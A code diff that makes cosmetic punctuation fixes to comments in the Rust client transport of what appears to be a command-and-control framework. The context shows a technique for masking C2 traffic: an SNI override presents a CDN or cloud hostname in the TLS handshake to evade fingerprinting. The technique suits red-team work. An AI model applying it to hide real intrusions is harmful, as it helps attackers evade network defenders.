@@ -135,7 +135,7 @@ pub struct ClientTransport {
 impl ClientTransport {
     pub fn new(config: &C2Config) -> Self {
         // Use sni_override when set so the ClientHello advertises a CDN or cloud
-        // hostname rather than the raw C2 IP — the actual TCP connection still
+        // hostname rather than the raw C2 IP - the actual TCP connection still
         // goes to c2_host:tunnel_port. This closes the TLS fingerprinting gap
         // that malleable HTTP profiles leave untouched.
         let sni_host = config
@@ -190,7 +190,7 @@ impl ClientTransport {
                 if let Some(connector) = &self.tls_connector {
                     // Build ServerName: try DNS name, then IP address.
                     // Reject invalid hostnames instead of silently falling back to
-                    // "localhost" — a quiet fallback masks configuration errors and
+                    // "localhost" - a quiet fallback masks configuration errors and
                     // can connect to an unintended endpoint.
                     let domain = if let Ok(ip) = self.tls_sni.parse::<std::net::IpAddr>() {
                         tokio_rustls::rustls::ServerName::IpAddress(ip)
@@ -331,7 +331,7 @@ mod tests {
     #[test]
     fn alpn_empty_by_default() {
         let config = base_config("10.0.0.1");
-        // No ALPN set → the vec is empty; rustls won't advertise any protocols
+        // No ALPN set -> the vec is empty; rustls won't advertise any protocols
         assert!(config.alpn_protocols.is_empty());
     }
 
